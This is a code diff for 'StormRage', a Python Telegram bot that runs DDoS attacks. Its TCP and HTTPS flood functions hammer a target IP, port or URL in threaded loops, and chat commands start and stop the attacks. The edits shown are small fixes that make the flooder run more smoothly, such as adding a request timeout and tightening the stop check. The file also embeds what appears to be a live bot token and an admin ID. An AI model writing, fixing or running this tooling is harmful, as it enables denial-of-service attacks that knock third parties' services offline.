@@ -5,25 +5,21 @@ import random
 import time
 import os
 import asyncio
-from telegram import Update, Bot
+from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
-# ==================== TELEGRAM BOT TOKEN ====================
-# CHANGE THIS TO YOUR BOT TOKEN FROM @BotFather
-BOT_TOKEN = "8957381735:AAEbDCbmmzvT1aDUBdUOjDAHZdbi5OQpxxQ"
+# ==================== CONFIGURATION ====================
+# CHANGE THESE TWO LINES
+BOT_TOKEN = "8957381735:AAEbDCbmmzvT1aDUBdUOjDAHZdbi5OQpxxQ"  # ← Put your bot token
+ADMIN_IDS = [7898928200]  # ← Put your Telegram user ID
 
-# Admin user IDs (your Telegram user ID)
-ADMIN_IDS = [7898928200]  # Get from @userinfobot
-
-# Store active attacks
+# Active attacks storage
 active_attacks = {}
 
 # ==================== ORIGINAL DDOS FUNCTIONS ====================
-# Function to clear the terminal screen
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-# TCP flood function
 def tcp_flood(ip, port, chat_id):
     while active_attacks.get(chat_id, False):
         try:
@@ -36,7 +32,6 @@ def tcp_flood(ip, port, chat_id):
         except:
             print(f"\033[91m[TCP] Failed to send packet to {ip}:{port}")
 
-# HTTPS flood function
 def https_flood(url, chat_id):
     while active_attacks.get(chat_id, False):
         try:
@@ -48,13 +43,12 @@ def https_flood(url, chat_id):
                     'Opera/9.80'
                 ])
             }
-            response = requests.get(url, headers=headers)
+            response = requests.get(url, headers=headers, timeout=3)
             print(f"\033[92m[HTTPS] Request sent to {url} | Status: {response.status_code}")
         except:
             print(f"\033[91m[HTTPS] Failed to send request to {url}")
 
 # ==================== TELEGRAM COMMANDS ====================
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMIN_IDS:
@@ -109,10 +103,9 @@ async def attack_tcp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         thread.daemon = True
         thread.start()
     
-    # Send live stats
+    # Background stats
     while active_attacks.get(chat_id, False):
         await asyncio.sleep(10)
-        await update.message.reply_text(f"💀 Attack still running on {ip}:{port}")
 
 async def attack_http(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -149,10 +142,8 @@ async def attack_http(update: Update, context: ContextTypes.DEFAULT_TYPE):
         thread.daemon = True
         thread.start()
     
-    # Send live stats
     while active_attacks.get(chat_id, False):
         await asyncio.sleep(10)
-        await update.message.reply_text(f"💀 HTTP flood still running on {url}")
 
 async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -161,7 +152,7 @@ async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     chat_id = update.effective_chat.id
-    if chat_id in active_attacks:
+    if chat_id in active_attacks and active_attacks[chat_id]:
         active_attacks[chat_id] = False
         await update.message.reply_text("🛑 Attack stopped successfully!")
     else:
@@ -182,8 +173,11 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await start(update, context)
 
-# ==================== MAIN ====================
+# ==================== MAIN FIXED ====================
 def main():
+    print("🤖 Starting StormRage Bot...")
+    print("⚠️ Make sure BOT_TOKEN and ADMIN_IDS are set correctly")
+    
     # Create bot application
     app = Application.builder().token(BOT_TOKEN).build()
     
@@ -195,10 +189,10 @@ def main():
     app.add_handler(CommandHandler("status", status))
     app.add_handler(CommandHandler("help", help_command))
     
-    print("🤖 StormRage Bot Started! Press Ctrl+C to stop.")
-    print(f"Bot running at: https://t.me/@{app.bot.username}" if app.bot.username else "Bot running")
+    print("✅ Bot handlers registered")
+    print("🚀 Bot is running...")
     
-    # Start the bot
+    # Start the bot (removed the problematic username line)
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
